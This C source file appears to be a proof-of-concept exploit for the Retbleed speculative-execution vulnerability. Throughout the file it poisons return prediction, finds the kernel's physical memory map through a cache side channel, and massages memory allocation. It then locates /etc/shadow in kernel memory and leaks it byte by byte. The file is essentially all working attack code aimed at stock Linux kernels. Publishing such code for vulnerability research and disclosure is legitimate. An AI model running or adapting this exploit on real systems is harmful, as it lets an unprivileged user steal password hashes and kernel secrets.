#define _GNU_SOURCE
       #include <sys/wait.h>
#define UBUNTU_5_8_0_63_GENERIC
#define INFO(...) printf("\r[-] " __VA_ARGS__)
#define SUCCESS(...) printf("\r[*] " __VA_ARGS__)
#define ERR(...) printf("[!] " __VA_ARGS__);

//#define DEBUG(...) printf("[d] " __VA_ARGS__);
#define DEBUG(...)

/* #define ALLOW_THP */

/* #define DEBIAN_5_10_26_kwik */
#include <err.h>
	    typedef void (*evict_fn)();
#include <fcntl.h>
       #include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <linux/sysctl.h>
#include <sched.h>
#include <ctype.h>
#include "retbleed.h"
#include "retbleed_zen.h"
#include "../massaging/massage_shadow.h"

#define PATH_LEN 33
#define PROBE_SET 43
#define TRAIN_RET 0x4000000000UL

/* #define VERIFY_HUGEPAGE */

static unsigned char *evict;

struct poison_info {
    u64 base; // _text start
    u64 bb_start;
    u64 target;
};

static int leak_range(struct mem_info *rb, struct poison_info *p, u64 secret_ptr, unsigned char prev_byte, u64 len, int leak_ascii);

//#define USE_ASCII_GADGET
#ifdef USE_ASCII_GADGET
#define NSPEC 0x80
#else
#define NSPEC 0x100
#endif
//#define NSPEC 0x80
__attribute__((aligned(0x1000))) static u64 results[NSPEC] = {};

#include <dirent.h>

static struct {
    int nblocks;
    // if block size is 128M, we fits 128 GiB of ram..
    int blocks[1024];
} phys_blocks;

// we get the available phys addresses of memory here
static void phys_blocks_init () {
#define MEM_BLOCK_SZ (128ul<<20)
#define PATH_MEM "/sys/devices/system/memory"
    int fd_mem = open(PATH_MEM, O_RDONLY|O_DIRECTORY);
    DIR *memdir = opendir(PATH_MEM);
    struct dirent *dent;
    int nblocks = 0;
    while ((dent = readdir(memdir)) != NULL) {
        int index;
        if (sscanf(dent->d_name, "memory%d", &index) == 0) continue;
        phys_blocks.blocks[nblocks++] = index;
    }
    phys_blocks.nblocks = nblocks;
    close(fd_mem);
}

struct cpu_topology {
    char sib_a;
    char sib_b;
};
static struct cpu_topology cpus[16];
void cpus_init () {
    int ncores = sysconf(_SC_NPROCESSORS_ONLN);
    INFO("Discovered %d cores.\n", ncores);
    char s[0x100];
    char topology[8]={0};
    int nmasks = ncores/2;
    int masks[nmasks];
    memset(masks, 0, nmasks * sizeof(*masks));
    for (int i = 0, mi=0; i < ncores; i++) {
        sprintf(s, "/sys/devices/system/cpu/cpu%d/topology/thread_siblings", i);
        int fd = open(s, O_RDONLY);
        read(fd, topology, 8);
        close(fd);
        int mask = strtoul(topology, NULL, 16);
        int exists = 0;
        for (int k = 0; k < i; ++k) {
            if (masks[k] == mask) {
                exists = k;
                break;
            }
        }
        if (!exists){
            masks[mi++] = mask;
        }
    }
    for (int i = 0; i < nmasks; ++i) {
        int mask = masks[i];
        for (int k = 0; k < ncores; ++k) {
            if ((mask>>k) & 1) {
                cpus[i].sib_a = k;
                break;
            }
        }
        for (int k = cpus[i].sib_a+1; k < ncores; ++k) {
            if ((mask>>k) & 1)  {
                cpus[i].sib_b = k;
                break;
            }
        }
    }
}




void evict_init() {
#define SZ (1UL<<19)
    evict  = mmap((void *)0xf3337000000UL, SZ, PROT_RWX, MMAP_FLAGS, -1, 0);
    /* madvise(evict, SZ, MADV_HUGEPAGE); */
    memset(evict, 0xc3, SZ);
    {
        int i;
        for (i = 0; i < ((1<<18)>>12)-1; ++i) {
            evict[OFFS+i*0x1000 + 0] = 0xe9;
            evict[OFFS+i*0x1000 + 1] = 0xfb;
            evict[OFFS+i*0x1000 + 2] = 0x0f;
            evict[OFFS+i*0x1000 + 3] = 0x00;
            evict[OFFS+i*0x1000 + 4] = 0x00;

            evict[OFFS+i*0x1000 + 5+0] = 0xe9;
            evict[OFFS+i*0x1000 + 5+1] = 0xfb;
            evict[OFFS+i*0x1000 + 5+2] = 0x0f;
            evict[OFFS+i*0x1000 + 5+3] = 0x00;
            evict[OFFS+i*0x1000 + 5+4] = 0x00;
        }
        evict[OFFS+i*0x1000 + 0] = 0xc3;
        evict[OFFS+i*0x1000 + 5] = 0xc3;
    }
}
void evict_free() {
    munmap(evict, SZ);
}

void poison_info_init(struct poison_info *p, u64 kernel_text) {
    p->base = kernel_text;
    u64 src = (p->base + MMAP_RET_OFFSET) ^ PWN_PATTERN2;

    u64 src_page = src & ~0xfffUL;
    p->bb_start = src_page + (MMAP_LAST_TGT&0xfff);
    map_or_die((u8 *)src_page, 0x1000, PROT_RWX, MMAP_FLAGS & ~MAP_FIXED_NOREPLACE, -1, 0);
    memset((u8 *)p->bb_start, 0x90, MMAP_RET_OFFSET - MMAP_LAST_TGT);

    // ff e1  jmp *%rcx
    *(u8 *)(src-1) = 0xff;
    *(u8 *)src     = 0xe1;
}

static const u64 RB_VA = 0x1330000000UL;

u8 best_guess_ascii(u64 *results) {
    int best = 0;
    u8 guess = 0;
    for (int i = 0x20; i < 0x80; ++i) {
        if (results[i] > best) {
            best = results[i];
            guess = i;
        }
    }
    return guess;
}

u8 best_guess(u64 *results, int n) {
    int best = 0;
    u8 guess = 0;
    results[5] = 0;
    for (int i = 0; i < n; ++i) {
        if (results[i] > best) {
            best = results[i];
            guess = i;
        }
    }
    return guess;
}

void print_guess(u8 guess, int ascii) {
    if (ascii) {
	    if(isprint(guess)) {
		    printf("%c", guess);
	    } else {
		    printf("[%02x]", guess);
	    }
    } else {
        printf("%02x", guess);
    }
    fflush(stdout);
}


void do_train(struct poison_info *pi, u64 *train_path) {
    should_segfault = 1;
    int a;
    a = sigsetjmp(env, 1);
    if (a == 0) TRAINING_ASM;
    should_segfault = 0;
}

#define CHECK_PGS 16ul

static struct poison_info p;

__attribute__((always_inline))
static inline u64 probe_phys_page(u64 try_pa, struct poison_info *pi, u8 *rb_va, long stride, int npages, int reps) {
    sched_yield();
#define CHECK_PGS_MAX 256
    static u64 results[CHECK_PGS_MAX];
    memset(results, 0, CHECK_PGS*sizeof(*results));
    for (int i = 0; i < reps; ++i){
        u64 t0, dt;
        do_train(pi, NULL);
        flush_range((long)rb_va + PROBE_SET*0x40, stride, npages);
        asm("mfence");
        ((evict_fn)(evict+OFFS))(); // i-cache evict seems to give a signal!
        CALL_PA_GADGET(try_pa + PROBE_SET*0x40);
        asm volatile("lfence");
        reload_range((long)rb_va + PROBE_SET * 0x40, stride, npages, results);
        int i = max_index(results, npages);
        if (results[i]>0) {
            /* printf("diff 0x%x -> %lx\n",(i<<12), try_pa-(i<<12)); */
            return try_pa-(i*stride);
        }
    }
    return 0;
}

u64 do_find_phys2 (void *rb_va, long alignment, int npages,int reps)
{
    p.target = p.base + PA_OFFSET;
    u64 mem_tot = phys_blocks.nblocks * MEM_BLOCK_SZ;
    u64 pa = 0;
    u64 t0 = get_ms();

    int fd_pagemap = open("/proc/self/pagemap", O_RDONLY);
    for (int i = 0; i < CHECK_PGS; ++i ) {
        long pa = va_to_phys(fd_pagemap, (long)rb_va + i*0x1000);
        if(pa) {
            printf("%lx\n", pa);
        }
    }
    close(fd_pagemap);

    // Some work left to be done here..
    printf("[-] Sweep over %lu MiB of memory to find %lx\n", mem_tot>>20,(long) rb_va);
    int retries = 10;
    while (retries--) {
        u64 t0 = get_ms();
        /* printf("."); */
        /* fflush(stdout); */
        int confirms = 0;
#define CONFIRMS_WANTED 2
        for (int b = 0; b < phys_blocks.nblocks; ++b) {
            u64 block_pa = phys_blocks.blocks[b]*MEM_BLOCK_SZ;
            for (long try_pa = block_pa; try_pa < block_pa+MEM_BLOCK_SZ; try_pa += alignment*npages) {
                confirms = 0;
                pa = probe_phys_page(try_pa, &p, rb_va, alignment, npages, reps);

                if (pa) {
                    // seems like there was signal here. try it again.
                    for (int i = 0; i < 10; ++i) {
                        if (pa == probe_phys_page(try_pa, &p, rb_va, alignment, npages, reps)) {
                            confirms++;
                        }
                    }
                    if (confirms >= CONFIRMS_WANTED) {
                        printf("[*] reload buffer pa @ %lx; t = %0.2fs\n", pa, (get_ms()-t0)/1000.0);
                        return pa;
                    }
                }
            }
        }
        INFO("Went over all memory. Took %0.2fs\n",(get_ms() - t0)/1000.0);
    }
    ERR("Cannot find PA. Give up\n");
    // yea sorry i dont care..
    if (fork() == 0) execl("killall", "killall", "lol", NULL);
    if (fork() == 0) execl("killall", "killall", "noisy_neighbor", NULL);
    exit(5);
    return -1;
}

u64 massage_find_phys (void *rb_va)
{
    return do_find_phys2(rb_va, 0x1000, CHECK_PGS,1);
}

int do_find_physmap (struct mem_info *rb, struct poison_info *p)
{
    p->target = p->base + PHYSMAP_OFFSET;
    sched_yield();
    while (1) {
        for (u64 try_phys_base = 0xffff880000000000UL; try_phys_base  < 0xffffd3fe00000000UL; try_phys_base += 1<<30){
            sched_yield();
            u64 results = 0;
            u64 try_kva = try_phys_base + rb->pa;
            for (int i = 0; i < 4; ++i) {
                do_train(p, NULL);
                asm volatile("clflushopt (%0)\n"::"r"(rb->va + PROBE_SET*0x40));
                ((evict_fn)(evict+OFFS))(); // i-cache evict seems to give a signal!
                CALL_PHYSMAP_GADGET(try_kva+PROBE_SET*0x40);
                u64 t0 = rdtsc();
                asm volatile("mov (%0), %%rax" :: "a"(rb->va+PROBE_SET*0x40));
                u64 dt = rdtscp() - t0;
                if (dt < 110) {
                    results++;
                }
            }
            if (results >= 2) {
                printf("[*] page_offset_base @ %lx\n", try_phys_base);
                printf("[*] reload buffer kva @ %lx\n", try_kva);
                rb->kva = try_kva;
                return 0;
            }
        }
    }
    printf("[!] I failed\n");
    return 0;
}

int leak_next(struct poison_info *p, struct mem_info *rb, u64 secret_ptr,
        unsigned char prev_byte, int leak_ascii) {
        memset(results, 0, sizeof(u64)*NSPEC);
        int nein = 0;
        sched_yield();
//#pragma clang loop unroll_count(95)
        for (int i = 0; i < 1000; i+=1) {
#define RB_OFF 0x100
            if ((i%40) == 0 ) {
                sched_yield();
            }
            flush_range(rb->va+RB_OFF, LEAK_STRIDE, NSPEC);
            for (int c = 0 ; c < 6; ++c) {
                do_train(p, NULL);
                ((evict_fn)(evict+OFFS))(); // i-cache evict seems to give a signal!
                CALL_LEAK_GADGET(secret_ptr, (rb->kva+RB_OFF), prev_byte);
            }
            reload_range(rb->va+RB_OFF, LEAK_STRIDE, NSPEC, results);
            u8 guess = leak_ascii ? best_guess_ascii(results) : best_guess(results, NSPEC);
#define THRESHOLD 1 // we usually don't have much noise
            if (results[guess] >= THRESHOLD)  {
                return guess;
            } else {
                nein++;
            }
        }
    return -1; // we failed
}

int leak_finger(struct poison_info *p, struct mem_info *rb, u64 secret_ptr,
        unsigned char prev_byte) {
    u64 results = 0;
    sched_yield();
    for (int c = 0 ; c < 22; ++c) {
        do_train(p, NULL);
        flush_range(rb->va, 0, 1);
        ((evict_fn)(evict+OFFS))(); // i-cache evict seems to give a signal!
        CALL_LEAK_GADGET(secret_ptr, rb->kva - ':' * LEAK_STRIDE, prev_byte);
        reload_range(rb->va, 0, 1, &results);
        if (results > 0) {
            return 0;
        }
    }
    return -1;
}


u64 do_find_shadow_range (struct mem_info *rb, struct poison_info *p, u64 start_pa, u64 npages) {
    u64 physmap_base = rb->kva - rb->pa;
    p->target = p->base + LEAK_OFFSET;
    int retry = 500;
    while (retry--) {
        /* ERR("Didn't find shadow\n"); */
        u64 try_shadow = physmap_base + start_pa;
        for (long i = 0, dir = 1; i < npages; i += 1, dir *= -1) {
            try_shadow += dir*i*0x1000;
            if (leak_finger(p, rb, try_shadow+0x76, '0') == 0) {
                if (leak_next(p, rb, try_shadow+0x77, ':', 1) == '9') {
                    /* printf("yes 2 %lx\n", try_shadow); */
                    for(int xx = 0 ; xx<20; ++xx) {
                        if (leak_next(p, rb, try_shadow+4, ':', 1) == '$') {
                            /* printf("yes 3\n"); */
                            SUCCESS("[%d] /etc/shadow @ %lx\n", gettid(), try_shadow);
                            return try_shadow;
                        }
                    }
                }
            }
        }
    }
    return -1ul;
}

u64 do_find_shadow (struct mem_info *rb, struct poison_info *p) {
    u64 physmap_base = rb->kva - rb->pa;
    p->target = p->base + LEAK_OFFSET;

    u64 found_pa = 0;
    u64 try_shadow = 0;

    int rnd = rand();
    INFO("Find /etc/shadow... (starting block %03d/%03d)\n", rnd%phys_blocks.nblocks, phys_blocks.nblocks);
    while (1) {
        for (int b = 0; b < phys_blocks.nblocks; ++b) {
            // Some work left to be done here..
            u64 block_pa = phys_blocks.blocks[(b+rnd)%phys_blocks.nblocks]*MEM_BLOCK_SZ;
            /* INFO("Find /etc/shadow... (block %03d/%03d) pa=%09lx--%09lx", (b+rnd)%phys_blocks.nblocks, phys_blocks.nblocks, block_pa, block_pa+MEM_BLOCK_SZ); */
            /* fflush(stdout); */

            for (long try_pa = block_pa; try_pa < block_pa+MEM_BLOCK_SZ; try_pa += 1UL<<12) {
                try_shadow = physmap_base + try_pa;
                if (try_pa % (1<<30) == 0) {
                    /* printf("current = 0x%lx\n", try_shadow); */
                }
                if (leak_finger(p, rb, try_shadow+0x76, '0') == 0) {
                    if (leak_next(p, rb, try_shadow+0x77, ':', 1) == '9') {
                        /* printf("yes 2 %lx\n", try_shadow); */
                        for(int xx = 0 ; xx<20; ++xx) {
                            if (leak_next(p, rb, try_shadow+4, ':', 1) == '$') {
                                /* printf("yes 3\n"); */
                                SUCCESS("Find /etc/shadow... (block %03d/%03d) "
                                        "/etc/shadow @ %lx\n", (b+rnd)%phys_blocks.nblocks,
                                        phys_blocks.nblocks, try_shadow);
                                return try_shadow;
                            }
                        }
                    }
                }
            }
        }
        INFO("\nGone full circle... shit\n");
    }

    return 1;
}


static int leak_range(struct mem_info *rb, struct poison_info *p, u64 secret_ptr, unsigned char prev_byte, u64 len, int leak_ascii)
{
    unsigned char everything[len+1];
    p->target = p->base + LEAK_OFFSET;
#define PRINT_ASCII 1
    everything[0] = prev_byte;
    int fails = 0;
    for (int i = 0 ; i < len ; ++i) {
        u64 cur_address = secret_ptr + i;
        int guess ;
//        #pragma clang loop unroll_count(95)
        for (int  x = 0; x < 20; ++x) {
            guess = leak_next(p, rb, cur_address, everything[i], leak_ascii);
            if (guess >= 0) {
                /* print_guess(guess, PRINT_ASCII); */
                /* fflush(stdout); */
                break;
            }
        }
        if (guess < 0) {
            if (fails < 10) {
                fails++;
                i-=5;
                INFO("[%d] step back.. i=%d discarding '", gettid(), i);
                for (int k = i; k < i+5; ++k) {
                    if (k < 0) continue;
                    print_guess(everything[k], PRINT_ASCII);
                }
                printf("'\n");
                if (i < -1) {
                    i = -1; // reset
                }
                continue;
            }
            for (int k = 0; k < i+1; ++k) {
                /* print_guess(everything[k], PRINT_ASCII); */
            }
            printf("\n");
            printf("[!] too many failed reads! (addr=%lx; i=%d). rb=0x%lx / 0x%lx\n", cur_address, i, rb->va, rb->pa);
            exit(10);
        }
        //print_guess(guess, PRINT_ASCII);
        everything[i+1] = guess;
        //prev_byte = guess;
    }

    for (int i = 0; i < len+1; ++i) {
        print_guess(everything[i], PRINT_ASCII);
    }
    printf("\n");
    return 0;
}

static char *buf[0x2000];


int main(int argc, char *argv[])
{
    int perf_test = 0;
    unsigned long kernel_text = 0;
    unsigned long guess_pa = 0;
    u64 full_run_t0 = get_ms();
    setbuf(stdout, NULL);

    int should_massage = 1;

    //setbuffer(stdout, buf,0x2000);
    if (argc < 2) {
        printf("Usage: %s <kernel_text> [perf_test]\n", argv[0]);
        printf("   Unless perf_test is given, start scanning for /etc/shadow.\n");
        printf("   Otherwise, leak 4096 bytes from a known kernel address.\n");
        return 1;
    }
    kernel_text = strtoul(argv[1], NULL, 16);
    perf_test = argc > 2;
    u64 sha_pa = 0;

    phys_blocks_init();
    prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_FORCE_DISABLE, 0, 0);
    srand(get_ms()^getpid());
    setup_segv_handler();

    // if we just use 4 threads , we don't need to find another rb.
    const int threads = sysconf(_SC_NPROCESSORS_ONLN)/2;
//    const int threads = 4; // allows us to search for less time

    struct mem_info rbs[threads];

    poison_info_init(&p, kernel_text);
    evict_init();
    cpus_init();
    int pids[threads];
    int pids_neighbor[threads];

#define RB_SZ (NSPEC * LEAK_STRIDE)
    struct cpu_topology *cpu = &cpus[0];
    int pid;
    if ((pid = fork()) == 0) {
        cpu_set_t c;
        CPU_ZERO(&c);
        CPU_SET(cpu->sib_a, &c);
        sched_setaffinity(0, sizeof(c), &c);
        execl("./noisy_neighbor", "noisy_neighbor", NULL);
    } else {
        pids_neighbor[0] = pid;
    }

    cpu_set_t c;
    CPU_ZERO(&c);
    CPU_SET(cpu->sib_b, &c);
    sched_setaffinity(0, sizeof(c), &c);
#ifdef ALLOW_THP
    INFO("THPs version\n");

#define ROUND_UP_2MB(x) (((((x)-1) >> 21) + 1) << 21)
    map_or_die((void *)RB_VA, ROUND_UP_2MB(threads * RB_SZ), PROT_RW, MMAP_FLAGS, -1, 0);
    madvise((void *)RB_VA, ROUND_UP_2MB(threads * RB_SZ), MADV_HUGEPAGE);
    const int rbs_per_thp = (1ul<<21) / RB_SZ;
    for (int i = 0 ; i < threads; ++i) {
        rbs[i].va = RB_VA + i * RB_SZ;
        rbs[i].buf[0] = 3; // map you
        if (i % rbs_per_thp == 0) {
            rbs[i].pa = do_find_phys2(rbs[i].buf, 1<<21, 1, 10);
        }
        rbs[i].pa = rbs[rbs_per_thp * (i/rbs_per_thp)].pa + (i%rbs_per_thp)*RB_SZ;
    }
#else
    INFO("No THPs version\n");

    // don't ask me, some noise on the noisy_neighbor increases the chance of finding the phys addr.
    if ((pid = fork()) == 0) {
        cpu_set_t c;
        CPU_ZERO(&c);
        CPU_SET(cpu->sib_a, &c);
        sched_setaffinity(0, sizeof(c), &c);
        execl("./lol", "lol", NULL);
        printf("this does not happen\n");
    }

    void *mass_buf;
    u64 mass_buf_pa;

    u64 t0 = get_ms();
    if (should_massage) {
        INFO("Buddy massage...");
        allocate_contiguous_massage_shadow(massage_find_phys, 0x600000UL, &mass_buf, &mass_buf_pa, &sha_pa);
        printf(" t = %0.2fs\n", (get_ms() - t0) / 1000.0);
        INFO("/etc/shadow hint: 0x%lx\n", sha_pa);
    } else {
        allocate_contiguous_evict_shadow(massage_find_phys, 0x600000UL, &mass_buf, &mass_buf_pa);
        INFO("Bring in /etc/shadow\n");
        if (fork() == 0) {
            // make sure /eth/shadow is cached...
            execl("/usr/bin/expiry", "expiry", "-c", NULL);
        }
        INFO("Evict & alloc t = %0.2fs\n", (get_ms() - t0) / 1000.0);
    }
    rbs[0].buf = mass_buf;
    rbs[0].pa = mass_buf_pa;

    const int rbs_per_2mb = (1ul<<21) / RB_SZ;
    const int rbs_per_4mb = rbs_per_2mb * 2;

    INFO("rb[0].va @ %lx ; rb[0].pa @ 0x%lx\n", rbs[0].va, rbs[0].pa);
    u64 pa = rbs[0].pa;

    for (int k = 0; k < rbs_per_2mb && k < threads;  ++k) {
        // we have 2mb we can already use.
        rbs[k].pa = pa + k * RB_SZ;
        rbs[k].va = rbs[0].va + k * RB_SZ;
        /* printf("%02d: %lx -> %lx\n", k, rbs[k].va, rbs[k].pa); */
    }

    // if we have even more threads..
    for (int k = rbs_per_2mb; k < threads; ++k) {
        rbs[k].va = rbs[0].va + k * RB_SZ;
        // every 8 rb we need to find a new page
        // but the first 4 are already done..
        if ((k - rbs_per_2mb) % rbs_per_4mb == 0) {
            // Slower
            rbs[k].pa  = do_find_phys2(rbs[k].buf, (1ul<<21), 1, 10);
        }
        // mind the integer division (i.e., 4 * (3/4) == 0) sorry for making
        // your eyes bleed.
        rbs[k].pa = rbs[rbs_per_2mb + rbs_per_4mb * ((k - rbs_per_2mb) / rbs_per_4mb)].pa + ((k - rbs_per_2mb)%rbs_per_4mb)*RB_SZ;
    }
    kill(pid, SIGINT);
#endif

    /* rb.buf[0x2202] = 12; // map the page. */
#define VERIFY_HUGEPAGE
#ifdef VERIFY_HUGEPAGE
    // only for root users.
    int fd_pagemap = open("/proc/self/pagemap", O_RDONLY);
    if (fd_pagemap < 0) {
        perror("fd_pagemap");
        exit(EXIT_FAILURE);
    }

    for (int i = 0 ; i < threads; ++i) {
        struct mem_info rb = rbs[i];
        u64 pa = va_to_phys(fd_pagemap, rb.va);
        if (pa && rb.pa != pa){
            printf("[-] Expected %lx; actual %lx\n",pa, rb.pa);
            printf("%lx -> %lx\n", rb.va, va_to_phys(fd_pagemap, rb.va));
        }
    }

    close(fd_pagemap);
#endif

    do_find_physmap(&rbs[0], &p);
    u64 physmap = rbs[0].kva - rbs[0].pa;
    for (int i = 1; i < threads; ++i) {
        rbs[i].kva = rbs[i].pa + physmap;
    }
    // up until this point we were doing everything on a single thread, this
    // step can take a bit longer so let's thread out
    for (int i = 0;  i < threads; ++i) {
        struct cpu_topology *cpu = &cpus[i];
        int pid;
        if(i != 0) {
            // 0 already running this
            if ((pid = fork()) == 0) {
                cpu_set_t c;
                CPU_ZERO(&c);
                CPU_SET(cpu->sib_a, &c);
                sched_setaffinity(0, sizeof(c), &c);
                execl("./noisy_neighbor", "noisy_neighbor", NULL);
            } else {
                DEBUG("neighbor pid %d\n", pid);
                pids_neighbor[i] = pid;
            }
        }

        // probably does not need to be fork.. but this works so not going to
        // touch it.
        if ((pid = fork()) == 0) {
            srand(get_ms()^gettid());
            cpu_set_t c;
            CPU_ZERO(&c);
            CPU_SET(cpu->sib_b, &c);
            sched_setaffinity(0, sizeof(c), &c);
            u64 nbytes;
            u64 m;
            char first_byte;
            INFO("[%d] My RB kva = %lx\n", gettid(), rbs[i].kva);
            if (perf_test) {
                m = kernel_text + LEAK_START;
                first_byte = FIRST_BYTE;
                nbytes = 4096;
            } else {
                // make sure we can leak successfully first.
                // NOTE: since we don't really have any solution for when it
                // doesn't work, we can just assume it always works go with
                // that...
                /* leak_range(&rbs[i], &p, kernel_text+LEAK_START, FIRST_BYTE, 1024, 0); */
                if (sha_pa == 0)  {
                    m = do_find_shadow(&rbs[i], &p);
                } else {
                    // we are going to look at 512 pages in the range given by
                    // the shadow hint
                    m = do_find_shadow_range(&rbs[i], &p, sha_pa, 512);
                }

                if (m == -1ul) {
                    ERR("[%d] Cannot find shadow near %lx.\n", gettid(), sha_pa);
                    _exit(4);
                }

                /* m = do_find_shadow_range(&rb, &p, sha_pa, 0x100000); */
                first_byte = 'r';
                nbytes = 128;
            }

            u64 t0 = get_ms();
            printf("[-] Read %lx: ", m);
            fflush(stdout);
            leak_range(&rbs[i], &p, m, first_byte, nbytes, perf_test == 0);
            SUCCESS("[%d] Leaked %ld bytes in %0.03f seconds\n", gettid(), nbytes, (get_ms()-t0)/1000.0);
            SUCCESS("finished after %0.2f seconds\n", (get_ms() -full_run_t0)/1000.0);
            exit(0);
        } else {
            pids[i] = pid;
        }
    }

    int status;
    /* waitpid(pids[i], &status, 0); */
    while (1) {
        int p = wait(&status);
        if (p == -1) {
            err(12, "wait()");
        }
        DEBUG("[%d] ended\n", p);
        int i;
        for (i = 0; i < threads; ++i) {
            if (p == pids[i]) {
                break;
            }
        }
        if (i != threads) {
            // clean up your neighbor..
            kill(pids_neighbor[i], SIGINT);
        }

        if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
            // exit w failure.
            continue;
        }
        // ah we're done
        if (i != threads) break;
    }

    // mh maybe I should learn programming.  can't i just do exit(0) and have
    // all children killed?
    for (int i = 0;  i < threads; ++i) {
        kill(pids[i], SIGINT);
        kill(pids_neighbor[i], SIGINT);
    }
}
